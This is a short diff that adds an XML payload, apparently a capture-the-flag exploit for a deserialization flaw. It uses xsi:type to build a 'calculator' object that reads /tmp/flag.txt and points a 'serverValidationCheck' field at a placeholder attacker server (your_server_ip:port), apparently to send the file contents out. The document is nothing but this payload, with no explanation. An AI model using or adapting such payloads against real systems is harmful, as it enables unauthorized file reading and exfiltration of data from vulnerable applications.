@@ -1,0 +1,10 @@
+node calculator
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Node>
+    <constructor xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="calculator">
+        <locationA>1</locationA>
+        <locationB>/tmp/flag.txt</locationB>
+        <serverValidationCheck>http://your_server_ip:port</serverValidationCheck>
+    </constructor>
+    <location>1</location>
+</Node>
